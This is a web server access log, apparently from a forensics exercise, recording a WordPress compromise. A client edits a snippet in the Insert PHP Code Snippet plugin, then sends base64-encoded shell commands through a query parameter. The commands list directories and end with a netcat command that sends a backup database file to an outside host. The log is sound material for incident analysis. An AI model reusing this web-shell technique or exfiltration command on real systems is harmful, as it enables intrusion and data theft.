192.168.206.131 - - [29/Mar/2025:22:41:56 +0000] "GET / HTTP/1.1" 200 10274 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0"
192.168.115.9 - - [29/Mar/2025:23:17:30 +0000] "GET /wp-content/plugins/insert-php-code-snippet/images/logo.png HTTP/1.1" 200 527 "http://chez-lebnin.com/wp-admin/admin.php?page=insert-php-code-snippet-manage&action=snippet-edit&snippetId=1&xyz_ips_msg=1&goback=2" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:17:30 +0000] "GET /wp-content/plugins/insert-php-code-snippet/images/new_star.png HTTP/1.1" 200 4758 "http://chez-lebnin.com/wp-content/plugins/insert-php-code-snippet/css/xyz_ips_styles.css?ver=6.7.2" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:17:30 +0000] "GET /wp-content/plugins/insert-php-code-snippet/images/insta.png HTTP/1.1" 200 1966 "http://chez-lebnin.com/wp-content/plugins/insert-php-code-snippet/css/xyz_ips_styles.css?ver=6.7.2" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:17:30 +0000] "GET /wp-content/plugins/insert-php-code-snippet/images/facebook.png HTTP/1.1" 200 668 "http://chez-lebnin.com/wp-content/plugins/insert-php-code-snippet/css/xyz_ips_styles.css?ver=6.7.2" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:17:30 +0000] "GET /wp-content/plugins/insert-php-code-snippet/images/linkedin.png HTTP/1.1" 200 887 "http://chez-lebnin.com/wp-content/plugins/insert-php-code-snippet/css/xyz_ips_styles.css?ver=6.7.2" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:17:30 +0000] "GET /wp-content/plugins/insert-php-code-snippet/images/twitter.png HTTP/1.1" 200 1007 "http://chez-lebnin.com/wp-content/plugins/insert-php-code-snippet/css/xyz_ips_styles.css?ver=6.7.2" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:17:57 +0000] "GET /wp-admin/admin.php?page=insert-php-code-snippet-manage&xyz_ips_msg=1 HTTP/1.1" 200 11892 "http://chez-lebnin.com/wp-admin/admin.php?page=insert-php-code-snippet-manage&action=snippet-add" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:17:57 +0000] "GET /wp-content/plugins/insert-php-code-snippet/images/edit.png HTTP/1.1" 200 3254 "http://chez-lebnin.com/wp-admin/admin.php?page=insert-php-code-snippet-manage&xyz_ips_msg=1" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:17:57 +0000] "GET /wp-content/plugins/insert-php-code-snippet/images/pause.png HTTP/1.1" 200 6963 "http://chez-lebnin.com/wp-admin/admin.php?page=insert-php-code-snippet-manage&xyz_ips_msg=1" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:17:57 +0000] "GET /wp-content/plugins/insert-php-code-snippet/images/delete.png HTTP/1.1" 200 3676 "http://chez-lebnin.com/wp-admin/admin.php?page=insert-php-code-snippet-manage&xyz_ips_msg=1" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:17:59 +0000] "GET /wp-admin/admin.php?page=insert-php-code-snippet-manage&action=snippet-status&snippetId=1&status=2&pageno=1&_wpnonce=5755344cd0 HTTP/1.1" 302 65794 "http://chez-lebnin.com/wp-admin/admin.php?page=insert-php-code-snippet-manage&xyz_ips_msg=1" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:17:59 +0000] "GET /wp-admin/admin.php?page=insert-php-code-snippet-manage&xyz_ips_msg=4&pagenum=1 HTTP/1.1" 200 11902 "http://chez-lebnin.com/wp-admin/admin.php?page=insert-php-code-snippet-manage&xyz_ips_msg=1" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:17:59 +0000] "GET /wp-content/plugins/insert-php-code-snippet/css/xyz_ips_styles.css?ver=6.7.2 HTTP/1.1" 200 3631 "http://chez-lebnin.com/wp-admin/admin.php?page=insert-php-code-snippet-manage&xyz_ips_msg=4&pagenum=1" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:17:59 +0000] "GET /wp-content/plugins/insert-php-code-snippet/js/notice.js?ver=6.7.2 HTTP/1.1" 200 173 "http://chez-lebnin.com/wp-admin/admin.php?page=insert-php-code-snippet-manage&xyz_ips_msg=4&pagenum=1" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:17:59 +0000] "GET /wp-content/plugins/insert-php-code-snippet/images/activate.png HTTP/1.1" 200 2855 "http://chez-lebnin.com/wp-admin/admin.php?page=insert-php-code-snippet-manage&xyz_ips_msg=4&pagenum=1" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:17:59 +0000] "GET /wp-content/plugins/insert-php-code-snippet/images/insta.png HTTP/1.1" 200 1966 "http://chez-lebnin.com/wp-content/plugins/insert-php-code-snippet/css/xyz_ips_styles.css?ver=6.7.2" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:17:59 +0000] "GET /wp-content/plugins/insert-php-code-snippet/images/logo.png HTTP/1.1" 200 527 "http://chez-lebnin.com/wp-admin/admin.php?page=insert-php-code-snippet-manage&xyz_ips_msg=4&pagenum=1" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:17:59 +0000] "GET /wp-content/plugins/insert-php-code-snippet/images/facebook.png HTTP/1.1" 200 668 "http://chez-lebnin.com/wp-content/plugins/insert-php-code-snippet/css/xyz_ips_styles.css?ver=6.7.2" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:17:59 +0000] "GET /wp-content/plugins/insert-php-code-snippet/images/twitter.png HTTP/1.1" 200 1007 "http://chez-lebnin.com/wp-content/plugins/insert-php-code-snippet/css/xyz_ips_styles.css?ver=6.7.2" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:17:59 +0000] "GET /wp-content/plugins/insert-php-code-snippet/images/linkedin.png HTTP/1.1" 200 887 "http://chez-lebnin.com/wp-content/plugins/insert-php-code-snippet/css/xyz_ips_styles.css?ver=6.7.2" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:17:59 +0000] "GET /wp-content/plugins/insert-php-code-snippet/images/new_star.png HTTP/1.1" 200 4758 "http://chez-lebnin.com/wp-content/plugins/insert-php-code-snippet/css/xyz_ips_styles.css?ver=6.7.2" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:18:03 +0000] "GET /wp-admin/admin.php?page=insert-php-code-snippet-manage&action=snippet-status&snippetId=1&status=1&pageno=1&_wpnonce=5755344cd0 HTTP/1.1" 302 65794 "http://chez-lebnin.com/wp-admin/admin.php?page=insert-php-code-snippet-manage&xyz_ips_msg=4&pagenum=1" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:18:03 +0000] "GET /wp-admin/admin.php?page=insert-php-code-snippet-manage&xyz_ips_msg=4&pagenum=1 HTTP/1.1" 200 11903 "http://chez-lebnin.com/wp-admin/admin.php?page=insert-php-code-snippet-manage&xyz_ips_msg=4&pagenum=1" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:18:04 +0000] "GET /favicon.ico HTTP/1.1" 499 0 "http://chez-lebnin.com/wp-admin/admin.php?page=insert-php-code-snippet-manage&xyz_ips_msg=4&pagenum=1" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:18:14 +0000] "GET /wp-admin/admin.php?page=insert-php-code-snippet-manage&action=snippet-edit&snippetId=1&pageno=1 HTTP/1.1" 200 11853 "http://chez-lebnin.com/wp-admin/admin.php?page=insert-php-code-snippet-manage&xyz_ips_msg=4&pagenum=1" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:19:00 +0000] "POST /wp-admin/admin.php?page=insert-php-code-snippet-manage&action=snippet-edit&snippetId=1&pageno=1 HTTP/1.1" 302 87662 "http://chez-lebnin.com/wp-admin/admin.php?page=insert-php-code-snippet-manage&action=snippet-edit&snippetId=1&pageno=1" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:19:00 +0000] "GET /wp-admin/admin.php?page=insert-php-code-snippet-manage&action=snippet-edit&snippetId=1&xyz_ips_msg=1&goback=2 HTTP/1.1" 200 11924 "http://chez-lebnin.com/wp-admin/admin.php?page=insert-php-code-snippet-manage&action=snippet-edit&snippetId=1&pageno=1" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:19:00 +0000] "GET /wp-content/plugins/insert-php-code-snippet/js/notice.js?ver=6.7.2 HTTP/1.1" 200 173 "http://chez-lebnin.com/wp-admin/admin.php?page=insert-php-code-snippet-manage&action=snippet-edit&snippetId=1&xyz_ips_msg=1&goback=2" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:19:00 +0000] "GET /wp-content/plugins/insert-php-code-snippet/css/xyz_ips_styles.css?ver=6.7.2 HTTP/1.1" 200 3631 "http://chez-lebnin.com/wp-admin/admin.php?page=insert-php-code-snippet-manage&action=snippet-edit&snippetId=1&xyz_ips_msg=1&goback=2" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:19:00 +0000] "GET /wp-content/plugins/insert-php-code-snippet/images/linkedin.png HTTP/1.1" 200 887 "http://chez-lebnin.com/wp-content/plugins/insert-php-code-snippet/css/xyz_ips_styles.css?ver=6.7.2" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:19:00 +0000] "GET /wp-content/plugins/insert-php-code-snippet/images/insta.png HTTP/1.1" 200 1966 "http://chez-lebnin.com/wp-content/plugins/insert-php-code-snippet/css/xyz_ips_styles.css?ver=6.7.2" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:19:00 +0000] "GET /wp-content/plugins/insert-php-code-snippet/images/logo.png HTTP/1.1" 200 527 "http://chez-lebnin.com/wp-admin/admin.php?page=insert-php-code-snippet-manage&action=snippet-edit&snippetId=1&xyz_ips_msg=1&goback=2" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:19:00 +0000] "GET /wp-content/plugins/insert-php-code-snippet/images/facebook.png HTTP/1.1" 200 668 "http://chez-lebnin.com/wp-content/plugins/insert-php-code-snippet/css/xyz_ips_styles.css?ver=6.7.2" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:19:00 +0000] "GET /wp-content/plugins/insert-php-code-snippet/images/twitter.png HTTP/1.1" 200 1007 "http://chez-lebnin.com/wp-content/plugins/insert-php-code-snippet/css/xyz_ips_styles.css?ver=6.7.2" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:19:00 +0000] "GET /wp-content/plugins/insert-php-code-snippet/images/new_star.png HTTP/1.1" 200 4758 "http://chez-lebnin.com/wp-content/plugins/insert-php-code-snippet/css/xyz_ips_styles.css?ver=6.7.2" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:19:00 +0000] "GET /favicon.ico HTTP/1.1" 499 0 "http://chez-lebnin.com/wp-admin/admin.php?page=insert-php-code-snippet-manage&action=snippet-edit&snippetId=1&xyz_ips_msg=1&goback=2" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:19:10 +0000] "POST /wp-admin/admin.php?page=insert-php-code-snippet-manage&action=snippet-edit&snippetId=1&xyz_ips_msg=1&goback=2 HTTP/1.1" 302 87843 "http://chez-lebnin.com/wp-admin/admin.php?page=insert-php-code-snippet-manage&action=snippet-edit&snippetId=1&xyz_ips_msg=1&goback=2" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:19:10 +0000] "GET /wp-admin/admin.php?page=insert-php-code-snippet-manage&action=snippet-edit&snippetId=1&xyz_ips_msg=1&goback=3 HTTP/1.1" 200 11902 "http://chez-lebnin.com/wp-admin/admin.php?page=insert-php-code-snippet-manage&action=snippet-edit&snippetId=1&xyz_ips_msg=1&goback=2" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:19:22 +0000] "POST /wp-admin/admin.php?page=insert-php-code-snippet-manage&action=snippet-edit&snippetId=1&xyz_ips_msg=1&goback=3 HTTP/1.1" 302 87839 "http://chez-lebnin.com/wp-admin/admin.php?page=insert-php-code-snippet-manage&action=snippet-edit&snippetId=1&xyz_ips_msg=1&goback=3" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:19:22 +0000] "GET /wp-admin/admin.php?page=insert-php-code-snippet-manage&action=snippet-edit&snippetId=1&xyz_ips_msg=1&goback=4 HTTP/1.1" 200 11899 "http://chez-lebnin.com/wp-admin/admin.php?page=insert-php-code-snippet-manage&action=snippet-edit&snippetId=1&xyz_ips_msg=1&goback=3" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:19:41 +0000] "POST /wp-admin/admin.php?page=insert-php-code-snippet-manage&action=snippet-edit&snippetId=1&xyz_ips_msg=1&goback=4 HTTP/1.1" 302 87835 "http://chez-lebnin.com/wp-admin/admin.php?page=insert-php-code-snippet-manage&action=snippet-edit&snippetId=1&xyz_ips_msg=1&goback=4" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:19:41 +0000] "GET /wp-admin/admin.php?page=insert-php-code-snippet-manage&action=snippet-edit&snippetId=1&xyz_ips_msg=1&goback=5 HTTP/1.1" 200 11897 "http://chez-lebnin.com/wp-admin/admin.php?page=insert-php-code-snippet-manage&action=snippet-edit&snippetId=1&xyz_ips_msg=1&goback=4" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:19:41 +0000] "GET /wp-content/plugins/insert-php-code-snippet/js/notice.js?ver=6.7.2 HTTP/1.1" 200 173 "http://chez-lebnin.com/wp-admin/admin.php?page=insert-php-code-snippet-manage&action=snippet-edit&snippetId=1&xyz_ips_msg=1&goback=5" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:19:41 +0000] "GET /wp-content/plugins/insert-php-code-snippet/css/xyz_ips_styles.css?ver=6.7.2 HTTP/1.1" 200 3631 "http://chez-lebnin.com/wp-admin/admin.php?page=insert-php-code-snippet-manage&action=snippet-edit&snippetId=1&xyz_ips_msg=1&goback=5" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:19:41 +0000] "GET /wp-content/plugins/insert-php-code-snippet/images/logo.png HTTP/1.1" 304 0 "http://chez-lebnin.com/wp-admin/admin.php?page=insert-php-code-snippet-manage&action=snippet-edit&snippetId=1&xyz_ips_msg=1&goback=5" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:19:41 +0000] "GET /wp-content/plugins/insert-php-code-snippet/images/facebook.png HTTP/1.1" 304 0 "http://chez-lebnin.com/wp-content/plugins/insert-php-code-snippet/css/xyz_ips_styles.css?ver=6.7.2" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:19:41 +0000] "GET /wp-content/plugins/insert-php-code-snippet/images/twitter.png HTTP/1.1" 304 0 "http://chez-lebnin.com/wp-content/plugins/insert-php-code-snippet/css/xyz_ips_styles.css?ver=6.7.2" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:19:41 +0000] "GET /wp-content/plugins/insert-php-code-snippet/images/insta.png HTTP/1.1" 304 0 "http://chez-lebnin.com/wp-content/plugins/insert-php-code-snippet/css/xyz_ips_styles.css?ver=6.7.2" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:19:41 +0000] "GET /wp-content/plugins/insert-php-code-snippet/images/linkedin.png HTTP/1.1" 304 0 "http://chez-lebnin.com/wp-content/plugins/insert-php-code-snippet/css/xyz_ips_styles.css?ver=6.7.2" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:19:41 +0000] "GET /wp-content/plugins/insert-php-code-snippet/images/new_star.png HTTP/1.1" 304 0 "http://chez-lebnin.com/wp-content/plugins/insert-php-code-snippet/css/xyz_ips_styles.css?ver=6.7.2" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:19:53 +0000] "GET /?x=ZWNobyAiSDRjSzNkIGJ5IExtMHVkMXIi HTTP/1.1" 200 11642 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:20:04 +0000] "GET /?x=ls HTTP/1.1" 200 11621 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:20:16 +0000] "GET /?x=bHM= HTTP/1.1" 200 11738 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:20:42 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 47 "http://chez-lebnin.com/wp-admin/admin.php?page=insert-php-code-snippet-manage&action=snippet-edit&snippetId=1&xyz_ips_msg=1&goback=5" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:22:13 +0000] "GET /?x=bHMgLi4v HTTP/1.1" 200 11631 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:22:13 +0000] "GET /favicon.ico HTTP/1.1" 499 0 "http://chez-lebnin.com/?x=bHMgLi4v" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:22:29 +0000] "GET /?x=bHMgLi4vYmFja3Vw HTTP/1.1" 200 11633 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:22:33 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 47 "http://chez-lebnin.com/wp-admin/admin.php?page=insert-php-code-snippet-manage&action=snippet-edit&snippetId=1&xyz_ips_msg=1&goback=5" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:23:33 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 47 "http://chez-lebnin.com/wp-admin/admin.php?page=insert-php-code-snippet-manage&action=snippet-edit&snippetId=1&xyz_ips_msg=1&goback=5" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:24:45 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 47 "http://chez-lebnin.com/wp-admin/admin.php?page=insert-php-code-snippet-manage&action=snippet-edit&snippetId=1&xyz_ips_msg=1&goback=5" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:25:45 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 47 "http://chez-lebnin.com/wp-admin/admin.php?page=insert-php-code-snippet-manage&action=snippet-edit&snippetId=1&xyz_ips_msg=1&goback=5" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:26:54 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 47 "http://chez-lebnin.com/wp-admin/admin.php?page=insert-php-code-snippet-manage&action=snippet-edit&snippetId=1&xyz_ips_msg=1&goback=5" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:27:19 +0000] "GET /?x=bHMgLi4v HTTP/1.1" 200 11652 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:27:54 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 47 "http://chez-lebnin.com/wp-admin/admin.php?page=insert-php-code-snippet-manage&action=snippet-edit&snippetId=1&xyz_ips_msg=1&goback=5" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:28:00 +0000] "GET /?x=bHM= HTTP/1.1" 200 11650 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:28:41 +0000] "GET /?x=bHMgLi4vYmFja3Vw HTTP/1.1" 200 11650 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:28:47 +0000] "GET /?x=bHMgLi4vYmFja3Vw HTTP/1.1" 200 11650 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:29:54 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 47 "http://chez-lebnin.com/wp-admin/admin.php?page=insert-php-code-snippet-manage&action=snippet-edit&snippetId=1&xyz_ips_msg=1&goback=5" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:30:42 +0000] "GET /?x=ZHNkc2Rz HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:30:43 +0000] "GET /?x=ZHNkc2Rz HTTP/1.1" 200 11650 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:31:11 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 47 "http://chez-lebnin.com/wp-admin/admin.php?page=insert-php-code-snippet-manage&action=snippet-edit&snippetId=1&xyz_ips_msg=1&goback=5" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:31:44 +0000] "GET /?x=bmMgbGhlZGktc2VydmVyLmNvbSA0NDQ0IDwgLi4vYmFja3VwL3NlY3JldC5kYgo= HTTP/1.1" 200 11651 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:31:47 +0000] "GET /sample-page/ HTTP/1.1" 200 11756 "http://chez-lebnin.com/?x=bmMgbGhlZGktc2VydmVyLmNvbSA0NDQ0IDwgLi4vYmFja3VwL3NlY3JldC5kYgo=" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:31:48 +0000] "GET / HTTP/1.1" 200 11607 "http://chez-lebnin.com/sample-page/" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:31:53 +0000] "GET /wp-admin/about.php HTTP/1.1" 200 10691 "http://chez-lebnin.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
192.168.115.9 - - [29/Mar/2025:23:31:53 +0000] "GET /wp-content/plugins/insert-php-code-snippet/js/notice.js?ver=6.7.2 HTTP/1.1" 200 173 "http://chez-lebnin.com/wp-admin/about.php" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0"
